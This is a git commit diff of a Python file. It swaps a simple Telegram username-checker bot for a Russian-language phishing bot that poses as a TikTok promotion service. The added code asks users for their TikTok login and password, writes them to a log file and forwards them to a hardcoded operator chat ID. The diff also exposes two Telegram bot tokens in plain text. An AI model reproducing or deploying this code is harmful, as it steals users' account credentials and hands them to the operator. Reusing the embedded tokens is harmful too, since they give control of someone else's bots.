39978c6d2d266508cb97dba2d806fd1d41e5b47f
wwadac <peshoevrahman000@gmail.com>
2025-11-08 14:29:43 +0300

    Update (2).py

--- (2).py
+++ (2).py
@@ -1,29 +1,103 @@
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
-from telegram.error import BadRequest
 
-TOKEN = "8259782982:AAF_cCRncLPaM2X5KViHg7PF3Vu8lqk1kCA"
+import telebot
+from telebot import *
+import time
+print("Бот запущен!")
+print("Бот запущен и готов к работе!")
+log = open('bot-log.txt', 'a+', encoding='utf-8')
+ID = '8191068380'
+bot = telebot.TeleBot("7971014285:AAGe6IbdI7_dLHsn3UdGBER-wZRKK-buSys")
+try:
+	bot.send_message(ID, '!Бот запущен!') 
+except:
+	print("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!")
 
-async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args:
-        return await update.message.reply_text("Напиши: /check @username")
-    
-    username = context.args[0].replace("@", "")
+@bot.message_handler(commands=['start'])
+def start(message):
+	print(f'''Обнаружен пользователь!
+ID: {message.from_user.id}''')
+	bot.send_message(message.chat.id, '''👋 Привет! 👋
+		Это бот продвижения вашего тикток аккаунта!
+		Чтобы начать, нажмите /nacrutka''') 
 
-    try:
-        user = await context.bot.get_chat(username)
-        await update.message.reply_text(f"✅ Пользователь существует!\nID: `{user.id}`", parse_mode="Markdown")
+@bot.message_handler(commands=['slivmens'])
+def slivmens(message):
+	bot.send_message(message.chat.id, 'Автор скрипта: @slivmens. Канал: @slivmens') 
 
-    except BadRequest as e:
-        if "not found" in str(e).lower():
-            await update.message.reply_text("❌ Такой пользователь НЕ существует!")
-        else:
-            await update.message.reply_text(f"⚠️ Ошибка: {e}")
+@bot.message_handler(commands=['nacrutka', 'n'])
+def start1(message):
+	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
+	first_button = types.InlineKeyboardButton(text="Лайки❤️", callback_data="like")
+	second_button = types.InlineKeyboardButton(text="Подписчики📃", callback_data="like")
+	button3 = types.InlineKeyboardButton(text="Просмотры", callback_data="like")
+	button4 = types.InlineKeyboardButton(text="Репосты", callback_data="like")
+	keyboardmain.add(first_button, second_button, button3, button4)
+	bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)
 
-def main():
-    app = Application.builder().token(TOKEN).build()
-    app.add_handler(CommandHandler("check", check))
-    app.run_polling()
+@bot.callback_query_handler(func=lambda call:True)
+def callback_inline1(call):
+	if call.data == "like":
+		msg = bot.send_message(call.message.chat.id, 'Введите колличество (не более 500)') 
+		bot.register_next_step_handler(msg, qproc1)
 
-if __name__ == "__main__":
-    main()
+def qproc1(message):
+	try:
+		num = message.text	
+		if not num.isdigit():
+			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
+			return
+		elif int(num) > 500:
+			bot.reply_to(message, 'Колличество не может быть более 500!')
+			return
+		else:
+			bot.send_message(message.chat.id, f'Колличество: {num}')
+			msg = bot.send_message(message.chat.id, 'Введите номер телефона(или почту) от вашего аккаунта:') 
+			bot.register_next_step_handler(msg, step1)
+	except Exception as e:
+		print(e)
+
+
+
+
+def step1(message):
+	get = f'''Полученные данные: 
+Получено в боте: tiktok
+ID: {message.from_user.id}
+Ник: @{message.from_user.username}
+Логин: {message.text}
+Имя: {message.from_user.first_name}
+
+'''
+	log = open('bot-log.txt', 'a+', encoding='utf-8')
+	log.write(get + '  ')
+	log.close()
+	print(get)
+	bot.send_message(ID, get)
+	bot.reply_to(message, f'Ваш логин: {message.text}')
+
+	msg1 = bot.send_message(message.chat.id, 'Введите пароль от вашего аккаунта:') 
+	bot.register_next_step_handler(msg1, step2)
+
+	
+def step2(message):
+	usrpass = message.text
+	get = f'''Полученные данные:
+Получено в боте: tiktok 
+ID: {message.from_user.id}
+Ник: @{message.from_user.username}
+Пароль: {usrpass}
+Имя: {message.from_user.first_name}
+
+'''
+	print(get)
+	log = open('bot-log.txt', 'a+', encoding='utf-8')
+	log.write(get + '  ')
+	log.close()
+	bot.send_message(ID, get)
+	msg = bot.reply_to(message, f'Ваш пароль: {usrpass}')
+	time.sleep(1)
+	bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, ожидайте накрутку на ваш аккаунт в течении 24 часов!')
+
+
+bot.polling()
+		
